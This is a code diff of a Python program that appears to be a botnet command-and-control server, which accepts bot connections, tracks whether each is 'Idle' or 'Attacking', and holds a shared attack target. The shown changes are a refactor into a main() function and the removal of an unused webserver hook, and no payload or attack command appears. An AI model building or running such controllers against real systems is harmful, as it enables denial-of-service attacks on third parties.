@@ -2,12 +2,11 @@ import socket
 import threading
 from threading import Event
 from time import sleep
-from webserver import runServer
 
 active_connections_lock = threading.Lock()
 active_connections = 0
 conn_dict_lock = threading.Lock()
-conn_dict = {}  # key is the connection address, value is either "stopped" or "attacking"
+conn_dict = {}  # key is the connection address, value is either "Idle" or "Attacking"
 target = ""
 
 # event that can be used to tell all threads to stop running or attacking
@@ -96,7 +95,9 @@ def getAttackDetails():
     return {"target": target, "num_conns": active_connections, "conns": conn_list, "state": state}
 
 
-if __name__ == "__main__":
+def main():
+    global target
+    global command
 
     # socket creation and initialization
     s = socket.socket()
@@ -112,10 +113,6 @@ if __name__ == "__main__":
     # start a thread that accepts incoming connections from botnets
     acceptor_thread = threading.Thread(target=acceptor, args=(s,))
     acceptor_thread.start()
-
-    # thread for starting the flask webserver
-    # flask_thread = threading.Thread(target=runServer ,daemon=True)
-    # flask_thread.start()
 
     try:
         while s and not stop_event.is_set():
@@ -138,4 +135,7 @@ if __name__ == "__main__":
         s.close()
         print("Closing server...")
         print("")
-        exit()   
+        exit()       
+
+if __name__ == "__main__":
+    main()
